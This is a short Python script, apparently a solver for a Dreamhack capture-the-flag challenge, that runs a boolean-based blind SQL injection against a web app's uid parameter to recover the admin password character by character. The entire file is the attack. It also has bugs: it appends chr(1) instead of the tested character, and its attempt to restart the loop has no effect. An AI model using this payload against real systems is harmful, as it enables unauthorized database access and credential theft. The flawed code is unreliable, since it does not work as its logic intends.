import requests
import string

host = 'host3.dreamhack.games'
port = 15473
url = f'http://{host}:{port}'


# Extract upw
upw = ''
index = 1

# for char in alphanumeric
for i in range(32, 126 + 1):
    payload = f"admin' and substr(upw,{index},1)='{chr(i)}"
    res = requests.get(f'{url}/?uid={payload}')

    if 'exists' in res.text:
        upw += chr(1)
        index += 1
        i = -1
        print(upw)

    print(i)

print(upw)
